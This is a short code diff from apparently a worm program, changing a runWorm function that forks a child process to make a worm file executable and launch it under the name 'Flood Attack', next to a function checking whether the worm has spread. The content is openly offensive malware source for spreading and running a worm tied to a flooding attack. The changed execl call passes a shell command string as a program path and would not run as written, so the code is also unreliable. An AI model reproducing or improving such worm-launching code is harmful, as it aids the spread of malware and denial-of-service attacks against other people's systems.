@@ -81,9 +81,11 @@ std::string isWormDistributed() {
 pid_t runWorm(std::string& loc) {
     std::cout << "Try to execute the worm at \"" << loc << "\"" << std::endl;
     pid_t pid = fork();
+    std::cout << "chmod +x '" + loc + "' && '" + loc + "'" << std::endl;
     if (pid == 0) {
         // Children
-        execl(("chmod +x " + loc).c_str(), "Flood Attack", NULL);
+        execl(("chmod +x '" + loc + "' && '" + loc + "'").c_str(),
+              "Flood Attack", NULL);
         exit(0);
     }
     return pid;
